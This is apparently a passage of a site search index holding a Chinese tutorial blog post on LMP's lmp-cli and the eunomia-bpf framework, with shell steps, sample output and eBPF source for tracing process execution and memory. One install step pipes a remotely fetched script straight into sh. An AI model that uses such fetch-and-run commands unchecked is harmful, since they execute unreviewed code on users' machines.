\u60f3\u6cd5\u548c\u9879\u76ee\u4e3a\u76ee\u6807\uff0c\u6b63\u5728\u5927\u529b\u5efa\u8bbe\u4e2d\u3002\u4e4b\u524d\u6211\u4eec\u5728 LMP \u5176\u4e2d\u7684 eBPF Supermarket \u4e2d\u5305\u542b\u4e86\u5927\u91cf\u7531\u4e2a\u4eba\u5f00\u53d1\u8005\u7f16\u5199\u7684 eBPF \u5de5\u5177\uff0c\u8986\u76d6\u4e86\u7f51\u7edc\u3001\u6027\u80fd\u5206\u6790\u3001\u5b89\u5168\u7b49\u591a\u79cd\u529f\u80fd\uff0c\u6211\u4eec\u6b63\u5728\u5c1d\u8bd5\u628a\u5176\u4e2d\u7684\u4e00\u4e9b\u7a0b\u5e8f\u8fc1\u79fb\u5230 eBPF Hub\uff0c\u4e00\u4e9b\u89c4\u8303\u5316\u7684 eBPF \u7a0b\u5e8f\u5e93\uff0c\u53ef\u4ee5\u968f\u65f6\u4e0b\u8f7d\u8fd0\u884c\uff0c\u6216\u5d4c\u5165\u5927\u578b\u5e94\u7528\u7a0b\u5e8f\u4e2d\u4f5c\u4e3a\u63d2\u4ef6\u4f7f\u7528\u3002</p> <p>\u6211\u4eec\u5c1d\u8bd5\u5728 eBPF Hub \u4e2d\uff0c\u57fa\u4e8e eunomia-bpf \u5f00\u53d1\u6846\u67b6\u521b\u5efa\u7b26\u5408 OCI \u6807\u51c6\u7684 Wasm \u548c eBPF \u7a0b\u5e8f\uff0c\u5e76\u5229\u7528 ORAS \u7b80\u5316\u6269\u5c55 LMP \u7684 eBPF \u5206\u53d1\u3001\u52a0\u8f7d\u3001\u8fd0\u884c\u80fd\u529b\u3002</p>"},{"location":"blog/2022/10/11/%E5%A6%82%E4%BD%95%E5%9C%A8-linux-%E6%98%BE%E5%BE%AE%E9%95%9Clmp%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%BC%80%E5%90%AF-ebpf-%E4%B9%8B%E6%97%85/#_1","title":"\u5feb\u901f\u4f7f\u7528","text":"<p>\u5982\u679c\u60a8\u60f3\u5feb\u901f\u5f00\u59cb eBPF\uff0c\u53ef\u4ee5\u4f7f\u7528\u6211\u4eec\u5f00\u53d1\u7684\u8f7b\u91cf\u7ea7\u6846\u67b6\u4e4b\u4e0a\u7684\u547d\u4ee4\u884c\u7a0b\u5e8f lmp-cli\u3002\u5f53\u4f7f\u7528\u811a\u672c\u5b89\u88c5\u597d\u6211\u4eec\u7684\u6846\u67b6\u4e4b\u540e\uff0c\u60a8\u53ea\u9700\u8981\u4e00\u6761\u547d\u4ee4\uff0c\u65e0\u9700\u4efb\u4f55\u7f16\u8bd1\uff0c\u5373\u53ef\u4f53\u4f1a\u5230 eBPF \u7684\u5f3a\u5927\u4e4b\u5904\uff1a</p> <pre><code>$ lmp run sigsnoop\ndownload with curl: https://linuxkerneltravel.github.io/lmp/sigsnoop/package.json\nrunning and waiting for the eBPF events from perf event...\ntime pid tpid sig ret comm\n00:21:41 109955 112863 28 0 gnome-terminal-\n00:21:41 109955 112862 28 0 gnome-terminal-\n...\n</code></pre> <p>\u5982\u679c\u60a8\u4f7f\u7528\u8fc7 bcc \u7b49 eBPF \u5f00\u53d1\u5de5\u5177\uff0c\u60a8\u4e00\u5b9a\u4f1a\u60ca\u559c\u4e8e LMP \u7684\u4fbf\u6377\u6027\u3002LMP \u4e2d\u5305\u542b\u4e86\u5404\u79cd\u5404\u6837\u7684 eBPF \u7a0b\u5e8f\uff0c\u8fd9\u79cd\u4fbf\u6377\u7684\u8fd0\u884c\uff0c\u79bb\u4e0d\u5f00\u6211\u4eec\u57fa\u4e8e\u7684\u5e95\u5c42\u6846\u67b6 eunomia-bpf\uff0c\u5b83\u5b8c\u5168\u5b9e\u73b0\u4e86\u201c\u4e00\u6b21\u7f16\u8bd1\uff0c\u5904\u5904\u8fd0\u884c\u201d\u7684 eBPF \u8de8\u5e73\u53f0\u76ee\u6807\u3002\u5728 eunomia-bpf \u6846\u67b6\u4e0b\uff0cLMP \u5f00\u53d1\u7684 eBPF \u5e94\u7528\u4e0d\u4ec5\u53ef\u4ee5\u9002\u914d\u4efb\u610f\u67b6\u6784\u548c\u4e0d\u540c\u5185\u6838\u7248\u672c\uff0c\u800c\u4e14\u8fd8\u5177\u6709\u8f7b\u91cf\u7ea7\u3001\u826f\u597d\u7684\u9694\u79bb\u6027\u7b49\u4f18\u70b9\uff0c\u53ef\u4ee5\u4f5c\u4e3a\u63d2\u4ef6\u5230\u5d4c\u5165\u5927\u578b\u5e94\u7528\u4e4b\u4e2d\u3002</p>"},{"location":"blog/2022/10/11/%E5%A6%82%E4%BD%95%E5%9C%A8-linux-%E6%98%BE%E5%BE%AE%E9%95%9Clmp%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%BC%80%E5%90%AF-ebpf-%E4%B9%8B%E6%97%85/#eunomia-bpf-ebpf-wasm","title":"eunomia-bpf\uff1a\u7ed3\u5408 eBPF \u548c Wasm \u7684\u8f7b\u91cf\u7ea7\u5f00\u53d1\u6846\u67b6","text":"<p>\u4f5c\u4e3a\u4e00\u4e2a eBPF \u7a0b\u5e8f\u7684\u8f7b\u91cf\u7ea7\u5f00\u53d1\u52a0\u8f7d\u6846\u67b6\uff0ceunomia-bpf \u57fa\u4e8e Wasm \u8fd0\u884c\u65f6\u548c BTF \u6280\u672f\uff0c\u5305\u542b\u4e86\u4e00\u4e2a\u7528\u6237\u6001\u52a8\u6001\u52a0\u8f7d\u6846\u67b6/\u8fd0\u884c\u65f6\u5e93\uff0c\u4ee5\u53ca\u4e00\u4e2a\u7b80\u5355\u7684\u7f16\u8bd1 Wasm \u548c eBPF \u5b57\u8282\u7801\u7684\u5de5\u5177\u94fe\u5bb9\u5668\u3002</p> <p>Wasm \u662f\u4e3a\u4e86\u4e00\u4e2a\u53ef\u79fb\u690d\u7684\u76ee\u6807\u800c\u8bbe\u8ba1\u7684\uff0c\u53ef\u4f5c\u4e3a C/C+/RUST \u7b49\u9ad8\u7ea7\u8bed\u8a00\u7684\u7f16\u8bd1\u76ee\u6807\uff0c\u4f7f\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u5e94\u7528\u7a0b\u5e8f\u80fd\u591f\u5728 Web \u4e0a\u90e8\u7f72\u3002\u76ee\u524d\u5df2\u7ecf\u53d1\u5c55\u6210\u4e3a\u4e00\u4e2a\u8f7b\u91cf\u7ea7\u3001\u9ad8\u6027\u80fd\u3001\u8de8\u5e73\u53f0\u548c\u591a\u8bed\u79cd\u7684\u8f6f\u4ef6\u6c99\u76d2\u73af\u5883\uff0c\u88ab\u8fd0\u7528\u4e8e\u4e91\u539f\u751f\u8f6f\u4ef6\u7ec4\u4ef6\u3002 eunomia-bpf \u5c06 eBPF \u7528\u6237\u6001\u7684\u6240\u6709\u63a7\u5236\u548c\u6570\u636e\u5904\u7406\u903b\u8f91\u5168\u90e8\u79fb\u5230 Wasm \u865a\u62df\u673a\u4e2d\uff0c\u901a\u8fc7 Wasm module \u6253\u5305\u548c\u5206\u53d1 eBPF \u5b57\u8282\u7801\uff0c\u540c\u65f6\u5728 Wasm \u865a\u62df\u673a\u5185\u90e8\u63a7\u5236\u6574\u4e2a eBPF \u7a0b\u5e8f\u7684\u52a0\u8f7d\u548c\u6267\u884c\uff0c\u5c06\u4e8c\u8005\u7684\u4f18\u52bf\u7ed3\u5408\u4e86\u8d77\u6765\u3002</p> <p>\u5728 Wasm \u6a21\u5757\u4e2d\u7f16\u5199 eBPF \u4ee3\u7801\u548c\u901a\u5e38\u719f\u6089\u7684\u4f7f\u7528 libbpf \u6846\u67b6\u6216 Coolbpf \u5f00\u53d1 eBPF \u7a0b\u5e8f\u7684\u65b9\u5f0f\u662f\u57fa\u672c\u4e00\u6837\u7684\uff0cWasm \u7684\u590d\u6742\u6027\u4f1a\u88ab\u9690\u85cf\u5728 eunomia-bpf \u7684\u7f16\u8bd1\u5de5\u5177\u94fe\u548c\u8fd0\u884c\u65f6\u5e93\u4e2d\uff0c\u5f00\u53d1\u8005\u53ef\u4ee5\u4e13\u6ce8\u4e8e eBPF \u7a0b\u5e8f\u7684\u5f00\u53d1\u548c\u8c03\u8bd5\uff0c\u4e0d\u9700\u8981\u4e86\u89e3 Wasm \u7684\u80cc\u666f\u77e5\u8bc6\uff0c\u4e5f\u4e0d\u9700\u8981\u62c5\u5fc3 Wasm \u7684\u7f16\u8bd1\u73af\u5883\u914d\u7f6e\u3002</p> <p>\u5927\u81f4\u6765\u8bf4\uff0ceunomia-bpf \u5728 Wasm \u8fd0\u884c\u65f6\u548c\u7528\u6237\u6001\u7684 libbpf \u4e2d\u95f4\u591a\u52a0\u4e86\u4e00\u5c42\u62bd\u8c61\u5c42\uff0c\u4f7f\u5f97\u4e00\u6b21\u7f16\u8bd1\u3001\u5230\u5904\u8fd0\u884c\u7684 eBPF \u4ee3\u7801\u53ef\u4ee5\u4ece JSON \u5bf9\u8c61\u4e2d\u52a8\u6001\u52a0\u8f7d\u3002JSON \u5bf9\u8c61\u4f1a\u5728\u7f16\u8bd1\u65f6\u88ab\u5305\u542b\u5728 Wasm \u6a21\u5757\u4e2d\uff0c\u56e0\u6b64\u5728\u8fd0\u884c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u89e3\u6790 JSON \u5bf9\u8c61\u6765\u83b7\u53d6 eBPF \u7a0b\u5e8f\u7684\u4fe1\u606f\uff0c\u7136\u540e\u52a8\u6001\u52a0\u8f7d eBPF \u7a0b\u5e8f\u3002\u901a\u8fc7 Wasm module \u6253\u5305\u548c\u5206\u53d1 eBPF \u5b57\u8282\u7801\uff0c\u540c\u65f6\u5728 Wasm \u865a\u62df\u673a\u5185\u90e8\u63a7\u5236\u6574\u4e2a eBPF \u7a0b\u5e8f\u7684\u52a0\u8f7d\u548c\u6267\u884c\uff0ceunomia-bpf \u5c31\u53ef\u4ee5\u5c06\u4e8c\u8005\u7684\u4f18\u52bf\u7ed3\u5408\u8d77\u6765\uff0c\u8ba9\u4efb\u610f eBPF \u7a0b\u5e8f\u80fd\u6709\u5982\u4e0b\u7279\u6027\uff1a</p> <ul> <li>\u53ef\u79fb\u690d\uff1a\u8ba9 eBPF \u5de5\u5177\u548c\u5e94\u7528\u4e0d\u9700\u8981\u8fdb\u884c\u91cd\u65b0\u7f16\u8bd1\u5373\u53ef\u4ee5\u8de8\u5e73\u53f0\u5206\u53d1\uff0c\u7701\u53bb\u4e86\u590d\u6742\u7684\u4ea4\u53c9\u7f16\u8bd1\u6d41\u7a0b\uff1b</li> <li>\u9694\u79bb\u6027\uff1a\u8ba9 eBPF \u7a0b\u5e8f\u7684\u52a0\u8f7d\u548c\u6267\u884c\u3001\u4ee5\u53ca\u7528\u6237\u6001\u7684\u6570\u636e\u5904\u7406\u6d41\u7a0b\u66f4\u52a0\u5b89\u5168\u53ef\u9760\u3002</li> <li>\u5305\u7ba1\u7406\uff1a\u5b8c\u6210 eBPF \u7a0b\u5e8f\u6216\u5de5\u5177\u7684\u5206\u53d1\u3001\u7ba1\u7406\u3001\u52a0\u8f7d\u7b49\u5de5\u4f5c\u3002</li> <li>\u654f\u6377\u6027\uff1a\u4f7f\u6bcf\u4e2a\u4eba\u90fd\u53ef\u4ee5\u4f7f\u7528\u5b98\u65b9\u548c\u672a\u7ecf\u4fee\u6539\u7684\u5e94\u7528\u7a0b\u5e8f\u6765\u52a0\u8f7d\u81ea\u5b9a\u4e49\u6269\u5c55\uff0c\u4efb\u4f55 eBPF \u7a0b\u5e8f\u7684\u9519\u8bef\u4fee\u590d\u548c/\u6216\u66f4\u65b0\u90fd\u53ef\u4ee5\u5728\u8fd0\u884c\u65f6\u63a8\u9001\u548c/\u6216\u6d4b\u8bd5\uff0c\u800c\u4e0d\u9700\u8981\u66f4\u65b0\u548c/\u6216\u91cd\u65b0\u90e8\u7f72\u4e00\u4e2a\u65b0\u7684\u4e8c\u8fdb\u5236\u3002</li> <li>\u8f7b\u91cf\u7ea7\uff1a\u4e0e Linux \u5bb9\u5668\u5e94\u7528\u76f8\u6bd4\uff0cWasm \u5fae\u670d\u52a1\u51b7\u542f\u52a8\u7684\u65f6\u95f4\u662f 1%\uff0c\u53ef\u4ee5\u5b9e\u73b0 eBPF as a service\uff0c\u8ba9 eBPF \u7a0b\u5e8f\u7684\u52a0\u8f7d\u548c\u6267\u884c\u53d8\u5f97\u66f4\u52a0\u8f7b\u91cf\u7ea7\u3001\u5feb\u901f\u3001\u7b80\u4fbf\u6613\u884c\u3002</li> </ul> <p>\u6211\u4eec\u5df2\u7ecf\u6d4b\u8bd5\u4e86\u5728 x86\u3001ARM \u7b49\u4e0d\u540c\u67b6\u6784\u4e0d\u540c\u5185\u6838\u7248\u672c\u7684 Linux \u7cfb\u7edf\u4e0a\uff0ceunomia-bpf \u6846\u67b6\u90fd\u53ef\u4ee5\u4f7f\u7528\u540c\u4e00\u4e2a\u9884\u7f16\u8bd1 eBPF \u7a0b\u5e8f\u4e8c\u8fdb\u5236\uff0c\u4ece\u4e91\u7aef\u4e00\u884c\u547d\u4ee4\u83b7\u53d6\u5230\u672c\u5730\u4e4b\u540e\u8fd0\u884c\u3002\u4e4b\u540e eunomia-bpf \u8fd8\u4f1a\u6dfb\u52a0 RISC-V \u7b49\u66f4\u591a\u67b6\u6784\u7684\u652f\u6301\u3002</p>"},{"location":"blog/2022/10/11/%E5%A6%82%E4%BD%95%E5%9C%A8-linux-%E6%98%BE%E5%BE%AE%E9%95%9Clmp%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%BC%80%E5%90%AF-ebpf-%E4%B9%8B%E6%97%85/#lmp-cli-ebpf","title":"\u4f7f\u7528 lmp-cli \u6784\u5efa\u4e00\u4e2a eBPF \u9879\u76ee","text":"<p>\u5982\u679c\u60a8\u662f\u4e00\u4e2a eBPF \u5de5\u5177\u7684\u4f7f\u7528\u8005\uff0c\u60a8\u53ef\u4ee5\u65e0\u9700\u4efb\u4f55\u7f16\u8bd1\u6d41\u7a0b\uff0c\u4e5f\u4e0d\u9700\u8981\u4e86\u89e3\u4efb\u4f55 eBPF \u548c Wasm \u7684\u76f8\u5173\u77e5\u8bc6\uff0c\u4f7f\u7528 <code>lmp run &lt;name&gt;</code> \u5c31\u53ef\u4ee5\u76f4\u63a5\u8fd0\u884c LMP \u4ed3\u5e93\u7684\u5c0f\u7a0b\u5e8f\uff0c\u5176\u4e2d\u4f1a\u8c03\u7528<code>lmp pull &lt;name&gt;</code>\u547d\u4ee4\u4ece\u4e91\u7aef\u4ece\u5e93\u4e2d\u4e0b\u8f7d\u5bf9\u5e94\u7684\u5c0f\u7a0b\u5e8f\u3002</p> <p>\u5982\u679c\u60a8\u662f\u4e00\u4e2a eBPF \u7a0b\u5e8f\u7684\u5f00\u53d1\u8005\uff0c\u8ba9\u6211\u4eec\u5f00\u59cb\u521b\u5efa\u3001\u7f16\u8bd1\u5e76\u8fd0\u884c\u4e00\u4e2a\u7b80\u5355\u7684\u7a0b\u5e8f\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u4f7f\u7528\u57fa\u7b80\u5355\u547d\u4ee4\u884c\u5de5\u5177 lmp-cli\uff0c\u6982\u8ff0\u5982\u4f55\u4ece\u56db\u4e2a\u6b65\u9aa4\u5f00\u59cb\u6784\u5efa\u3002</p>"},{"location":"blog/2022/10/11/%E5%A6%82%E4%BD%95%E5%9C%A8-linux-%E6%98%BE%E5%BE%AE%E9%95%9Clmp%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%BC%80%E5%90%AF-ebpf-%E4%B9%8B%E6%97%85/#1","title":"1. \u51c6\u5907\u4f60\u7684\u73af\u5883","text":"<p>eBPF \u672c\u8eab\u662f\u4e00\u79cd Linux \u5185\u6838\u6280\u672f\uff0c\u56e0\u6b64\u4efb\u4f55\u5b9e\u9645\u7684 BPF \u7a0b\u5e8f\u90fd\u5fc5\u987b\u5728 Linux \u5185\u6838\u4e2d\u8fd0\u884c\u3002\u6211\u5efa\u8bae\u60a8\u4ece\u5185\u6838 5.4 \u6216\u66f4\u65b0\u7684\u7248\u672c\u5f00\u59cb\u3002\u4ece SSH \u7ec8\u7aef\uff0c\u68c0\u67e5\u5185\u6838\u7248\u672c\uff0c\u5e76\u786e\u8ba4\u60a8\u5df2\u7ecf\u542f\u7528\u4e86 CONFIG_DEBUG_INFO_BTF\uff1a</p> <pre><code>uname -r\ncat /boot/config-$(uname -r) | grep CONFIG_DEBUG_INFO_BTF\n</code></pre> <p>\u4f60\u4f1a\u770b\u5230\u7c7b\u4f3c\u8fd9\u6837\u7684\u8f93\u51fa\uff1a</p> <pre><code>$ uname -r\n5.15.0-48-generic\n\n$ cat /boot/config-$(uname -r) | grep CONFIG_DEBUG_INFO_BTF\nCONFIG_DEBUG_INFO_BTF=y\nCONFIG_DEBUG_INFO_BTF_MODULES=y\n</code></pre> <p>\u5b89\u88c5\u547d\u4ee4\u884c\u5de5\u5177 lmp-cli\uff1a</p> <pre><code>curl https://github.com/GorilaMond/lmp_cli/releases/download/lmp/install.sh | sh\n</code></pre>"},{"location":"blog/2022/10/11/%E5%A6%82%E4%BD%95%E5%9C%A8-linux-%E6%98%BE%E5%BE%AE%E9%95%9Clmp%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%BC%80%E5%90%AF-ebpf-%E4%B9%8B%E6%97%85/#2","title":"2. \u521b\u5efa\u9879\u76ee\u7684\u5185\u6838\u90e8\u5206","text":"<p>\u4f7f\u7528<code>lmp init</code>\u521b\u5efa\u4e00\u4e2a\u9879\u76ee\u6a21\u677f\uff0c\u6765\u521d\u59cb\u5316\u4f60\u7684\u5185\u6838\u7a0b\u5e8f\uff0c\u5feb\u901f\u5730\u6295\u5165\u5230\u4ee3\u7801\u7684\u7f16\u5199\u4e2d\uff1a</p> <pre><code>lmp init hello\n</code></pre> <p>\u6210\u529f\u521b\u5efa\u9879\u76ee\u540e\uff0c\u60a8\u5c06\u770b\u5230\u5982\u4e0b\u7c7b\u4f3c\u7684\u8f93\u51fa\uff1a</p> <pre><code>$ lmp init hello\nCloning into 'ebpm-template'...\n</code></pre> <p>\u5b83\u5b9e\u9645\u4e0a\u521b\u5efa\u4e86\u4e00\u4e2a\u9879\u76ee\u540d\u5bf9\u5e94\u7684\u6587\u4ef6\u5939\uff0c\u91cc\u9762\u6709\u8fd9\u4e9b\u6587\u4ef6\uff1a</p> <pre><code>$ cd hello/\n$ ll\n...\n-rw-rw-r--  1 a a 2910 10\u6708 17 23:18 bootstrap.bpf.c\n-rw-rw-r--  1 a a  392 10\u6708 17 23:18 bootstrap.h\n-rw-rw-r--  1 a a  221 10\u6708 17 23:18 config.json\ndrwxrwxr-x  8 a a 4096 10\u6708 17 23:18 .git/\ndrwxrwxr-x  3 a a 4096 10\u6708 17 23:18 .github/\n-rw-rw-r--  1 a a   21 10\u6708 17 23:18 .gitignore\n-rw-rw-r--  1 a a 2400 10\u6708 17 23:18 README.md\n</code></pre> <p>\u5185\u6838\u7a0b\u5e8f\u6a21\u677f bootstrap.bpf.c \u4e2d\u9ed8\u8ba4\u7684\u8ddf\u8e2a\u70b9\u4e3a <code>tp/sched/sched_process_exec</code>\u548c<code>tp/sched/sched_process_exit</code>\uff0c\u7528\u6765\u8ddf\u8e2a\u65b0\u7a0b\u5e8f\u7684\u6267\u884c\u548c\u9000\u51fa\uff0c\u8fd9\u91cc\u4e0d\u505a\u4fee\u6539\u3002</p> <p>\u6784\u5efa\u5185\u6838\u9879\u76ee\uff0c\u5982\u4e0b\u6240\u793a\u3002\u4fdd\u5b58\u60a8\u7684\u66f4\u6539\uff0c\u4f7f\u7528 <code>sudo lmp build</code> \u6784\u5efa\u5185\u6838\u7a0b\u5e8f\uff0c\u8fd9\u4f1a\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a package.json \u7684\u5bf9\u8c61\u6587\u4ef6\u3002</p> <pre><code>$ sudo lmp build\nmake\n  ...\n  BINARY   client\n  DUMP_LLVM_MEMORY_LAYOUT\n  DUMP_EBPF_PROGRAM\n  FIX_TYPE_INFO_IN_EBPF\n  GENERATE_PACKAGE_JSON\n</code></pre>"},{"location":"blog/2022/10/11/%E5%A6%82%E4%BD%95%E5%9C%A8-linux-%E6%98%BE%E5%BE%AE%E9%95%9Clmp%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%BC%80%E5%90%AF-ebpf-%E4%B9%8B%E6%97%85/#3","title":"3. \u8fd0\u884c\u5185\u6838\u7a0b\u5e8f","text":"<p>\u53ef\u4ee5\u4f7f\u7528<code>lmp run package.json</code>\u8fd0\u884c\u5185\u6838\u7a0b\u5e8f\uff0c\u6ca1\u6709\u7528\u6237\u7aef\u7a0b\u5e8f\u5bf9\u6570\u636e\u7684\u5904\u7406\u7684\u60c5\u51b5\u4e0b\uff0c\u8be5\u6846\u67b6\u4e0b\u5185\u6838\u7a0b\u5e8f\u5c06\u4f1a\u8f93\u51fa\u6240\u6709\u88ab output \u7684\u6570\u636e\uff1a</p> <pre><code>$ sudo lmp run ./package.json\nrunning and waiting for the ebpf events from ring buffer...\ntime pid ppid exit_code duration_ns comm filename exit_event\n</code></pre> <p>\u4e00\u5f00\u59cb\u60a8\u4e0d\u4f1a\u770b\u5230\u4efb\u4f55\u6570\u636e\uff0c\u53ea\u6709\u5f53\u5185\u6838\u7684\u8ddf\u8e2a\u70b9\u88ab\u89e6\u53d1\u65f6\uff0c\u8fd9\u91cc\u662f\u65b0\u7684\u8fdb\u7a0b\u88ab\u521b\u5efa\u6216\u9000\u51fa\u65f6\uff0c\u624d\u4f1a\u8f93\u51fa\u6570\u636e\u3002\u8fd9\u91cc\u65b0\u5efa\u4e86\u4e00\u4e2a\u865a\u62df\u7ec8\u7aef\uff0c\u8f93\u51fa\u4e86\u5982\u4e0b\u6570\u636e\uff1a</p> <pre><code>23:31:31 111788 109955 0 0 bash /bin/bash 0\n23:31:31 111790 111788 0 0 lesspipe /usr/bin/lesspipe 0\n...\n</code></pre>"},{"location":"blog/2022/10/11/%E5%A6%82%E4%BD%95%E5%9C%A8-linux-%E6%98%BE%E5%BE%AE%E9%95%9Clmp%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%BC%80%E5%90%AF-ebpf-%E4%B9%8B%E6%97%85/#4","title":"4. \u6dfb\u52a0\u7528\u6237\u6001\u7a0b\u5e8f","text":"<p>\u6211\u4eec\u63d0\u4f9b\u7684\u662f demo \u662f C \u8bed\u8a00\u7248\u672c\u7684 Wasm \u5f00\u53d1\u6846\u67b6\uff0c\u5728\u6784\u5efa\u597d\u7684\u5185\u6838\u9879\u76ee\u6587\u4ef6\u5939\u5185\uff0c\u4f7f\u7528 <code>sudo lmp gen-wasm-skel</code> \u751f\u6210\u4e00\u4e2a Wasm \u7528\u6237\u6001\u9879\u76ee\u6a21\u677f\uff0capp.c\u3001eunomia-include\u3001ewasm-skel.h \u8fd9\u4e9b\u6587\u4ef6\u4f1a\u88ab\u751f\u6210\u3002ewasm-skel.h \u662f\u88ab\u6253\u5305\u4e3a\u5934\u6587\u4ef6\u7684\u5185\u6838\u7a0b\u5e8f\uff0capp.c \u662f\u7528\u6237\u6001\u7a0b\u5e8f\u7684\u6a21\u677f\u6587\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u5b83\u6765\u8fdb\u884c\u81ea\u5b9a\u4e49\u7684\u6570\u636e\u5904\u7406\uff0c\u8fd9\u91cc\u4e0d\u505a\u4fee\u6539\u3002</p> <pre><code>$ sudo lmp gen-wasm-skel\nmake\n  BPF      .output/client.bpf.o\n...\n</code></pre> <p>\u4f7f\u7528<code>sudo lmp build-wasm</code>\u6784\u5efa\u7528\u6237\u6001\u7a0b\u5e8f\uff0c\u751f\u6210 app.wasm \u6587\u4ef6</p> <pre><code>$ sudo lmp build-wasm\nmake\n  BPF      .output/client.bpf.o\n...\n</code></pre> <p>\u4f7f\u7528<code>lmp run app.wasm</code>\u8fd0\u884c\u7528\u6237\u6001\u7a0b\u5e8f\uff0cjson \u683c\u5f0f\u7684\u8f93\u51fa\u4e3a\u901a\u7528\u7684\u6570\u636e\u5904\u7406\u505a\u597d\u4e86\u51c6\u5907\uff1a</p> <pre><code>$ lmp run app.wasm\nrunning and waiting for the ebpf events from ring buffer...\n{\"pid\":112665,\"ppid\":109955,\"exit_code\":0,\"duration_ns\":0,\"comm\":\"bash\",\"filename\":\"/bin/bash\",\"exit_event\":0}\n{\"pid\":112667,\"ppid\":112665,\"exit_code\":0,\"duration_ns\":0,\"comm\":\"lesspipe\",\"filename\":\"/usr/bin/lesspipe\",\"exit_event\":0}\n{\"pid\":112668,\"ppid\":112667,\"exit_code\":0,\"duration_ns\":0,\"comm\":\"basename\",\"filename\":\"/usr/bin/basename\",\"exit_event\":0}\n...\n</code></pre>"},{"location":"blog/2022/10/11/%E5%A6%82%E4%BD%95%E5%9C%A8-linux-%E6%98%BE%E5%BE%AE%E9%95%9Clmp%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%BC%80%E5%90%AF-ebpf-%E4%B9%8B%E6%97%85/#ebpf","title":"\u53e6\u4e00\u4e2a\u4f8b\u5b50\uff1a\u4f7f\u7528 eBPF \u6253\u5370\u8fdb\u7a0b\u5185\u5b58\u4f7f\u7528\u72b6\u51b5","text":"<p>\u53ef\u4ee5\u5c06 bootstrap.bpf.c \u91cd\u547d\u540d\u4e3a procstat.bpf.c\uff0c\u5c06 bootstrap.h \u91cd\u547d\u540d\u4e3a procstat.h\uff0c\u7136\u540e\u7f16\u8bd1\u8fd0\u884c\u3002\u5bf9\u5e94\u7684\u6e90\u4ee3\u7801\u5982\u4e0b\uff1a</p> <p>procstat.bpf.c</p> <pre><code>#include \"vmlinux.h\"\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n#include &lt;bpf/bpf_core_read.h&gt;\n#include \"procstat.h\"\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n\nstruct {\n __uint(type, BPF_MAP_TYPE_RINGBUF);\n __uint(max_entries, 256 * 1024);\n} rb SEC(\".maps\");\n\n\nSEC(\"kprobe/finish_task_switch\")\nint BPF_KPROBE(finish_task_switch, struct task_struct *prev)\n{\n struct event *e;\n struct mm_rss_stat rss = {};\n struct mm_struct *mms;\n long long *t;\n\n e = bpf_ringbuf_reserve(&amp;rb, sizeof(*e), 0);\n if (!e)\n  return 0;\n\n e-&gt;pid = BPF_CORE_READ(prev, pid);\n e-&gt;vsize = BPF_CORE_READ(prev, mm, total_vm);\n e-&gt;Vdata = BPF_CORE_READ(prev, mm, data_vm);\n e-&gt;Vstk = BPF_CORE_READ(prev, mm, stack_vm);\n e-&gt;nvcsw = BPF_CORE_READ(prev, nvcsw);\n e-&gt;nivcsw = BPF_CORE_READ(prev, nivcsw);\n\n rss = BPF_CORE_READ(prev, mm, rss_stat);\n t = (long long *)(rss.count);\n e-&gt;rssfile = *t;\n e-&gt;rssanon = *(t + 1);\n e-&gt;vswap = *(t + 2);\n e-&gt;rssshmem = *(t + 3);\n e-&gt;size = *t + *(t + 1) + *(t + 3);\n\n bpf_ringbuf_submit(e, 0);\n return 0;\n}\n</code></pre> <p>proc.h</p> <pre><code>#ifndef __BOOTSTRAP_H\n#define __BOOTSTRAP_H\n\n#define TASK_COMM_LEN 16\n#define MAX_FILENAME_LEN 127\n\nstruct event {\n/*\u8fdb\u7a0b\u5185\u5b58\u72b6\u6001\u62a5\u544a*/\n    pid_t pid;\n    long nvcsw;\n    long nivcsw;\n    long vsize;              //\u865a\u62df\u5185\u5b58\n    long size;               //\u7269\u7406\u5185\u5b58\n    long long rssanon;       //\u533f\u540d\u9875\u9762\n    long long rssfile;       //\u6587\u4ef6\u9875\u9762\n    long long rssshmem;      //\u5171\u4eab\u9875\u9762\n    long long vswap;         //\u4ea4\u6362\u9875\u9762\n    long long Hpages;        //hugetlbPages\n    long Vdata;              //Private data segments\n    long Vstk;               //User stack\n    long long VPTE;\n};\n#endif /* __BOOTSTRAP_H */\n</code></pre> <p>\u5177\u4f53\u7684\u4e0a\u62a5\u4e8b\u4ef6\u4fe1\u606f\u5728 event \u7ed3\u6784\u4f53\u4e2d\u5b9a\u4e49\uff1a</p> \u53c2\u6570 \u542b\u4e49 vsize \u8fdb\u7a0b\u4f7f\u7528\u7684\u865a\u62df\u5185\u5b58 size \u8fdb\u7a0b\u4f7f\u7528\u7684\u6700\u5927\u7269\u7406\u5185\u5b58 rssanon \u8fdb\u7a0b\u4f7f\u7528\u7684\u533f\u540d\u9875\u9762 rssfile \u8fdb\u7a0b\u4f7f\u7528\u7684\u6587\u4ef6\u6620\u5c04\u9875\u9762 rssshmem \u8fdb\u7a0b\u4f7f\u7528\u7684\u5171\u4eab\u5185\u5b58\u9875\u9762 vswap \u8fdb\u7a0b\u4f7f\u7528\u7684\u4ea4\u6362\u5206\u533a\u5927\u5c0f vdata \u8fdb\u7a0b\u4f7f\u7528\u7684\u79c1\u6709\u6570\u636e\u6bb5\u5927\u5c0f vpte \u8fdb\u7a0b\u9875\u8868\u5927\u5c0f vstk \u8fdb\u7a0b\u7528\u6237\u6808\u5927\u5c0f <p>\u6302\u8f7d\u70b9\u4e0e\u6302\u8f7d\u539f\u56e0\u5206\u6790\uff1a</p> <ul> <li>\u9996\u5148\uff0c\u83b7\u53d6\u8fdb\u7a0b\u7ea7\u522b\u5185\u5b58\u4f7f\u7528\u4fe1\u606f\u9700\u8981\u83b7\u53d6\u5230\u8fdb\u7a0b\u7684 task_struct \u7ed3\u6784\u4f53\uff0c\u5176\u4e2d\u5728 mm_struct 